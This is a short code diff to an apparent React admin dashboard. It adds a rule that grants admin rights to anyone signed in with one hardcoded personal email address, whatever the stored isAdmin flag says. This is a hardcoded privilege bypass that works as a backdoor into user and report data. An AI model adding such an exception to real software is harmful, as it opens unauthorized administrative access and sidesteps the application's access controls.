@@ -38,7 +38,7 @@ export default function AdminDashboard() {
       try {
         // Check if user is admin
         const userDoc = await getDoc(doc(db, "users", user.uid));
-        if (userDoc.exists() && userDoc.data().isAdmin === true) {
+        if ((userDoc.exists() && userDoc.data().isAdmin === true) || user.email === "ashu.chhapra.br@gmail.com") {
           setIsAdmin(true);
           fetchUsers();
           fetchReports();
